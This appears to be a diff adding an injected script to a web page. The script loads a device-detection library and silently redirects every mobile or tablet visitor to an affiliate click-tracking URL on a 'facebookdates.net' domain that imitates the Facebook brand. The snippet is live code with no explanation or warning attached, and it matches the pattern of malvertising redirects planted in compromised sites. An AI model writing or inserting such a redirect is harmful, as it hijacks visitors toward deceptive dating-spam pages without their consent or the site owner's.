@@ -1,0 +1,13 @@
+<script src="https://cdn-bimi.akamaized.net/mr/mobile-detect.min.js"></script> <script type="text/javascript">
+var md = new MobileDetect(window.navigator.userAgent);
+if (md.mobile() || md.tablet()) {
+var redirect = false;
+var excludeTablets = true;
+var excludeIOSAndroid = true;
+var isiOs = md.is("iOs"); var isAndroidOs = md.is("AndroidOs"); var isFeaturePhone = md.mobile() && !isiOs && !isAndroidOs; if (isFeaturePhone || md.tablet() && excludeTablets
+|| (((isiOs && !md.tablet()) || isAndroidOs) && excludeIOSAndroid)) {
+redirect = true;
+}
+
+if (redirect) {
+location.href= 'https://laldwd.facebookdates.net/c/2148702d7c2782df?s1=95240&s2=1200898&click_id=Mallboro&j1=1&j3=1'; }}</script>
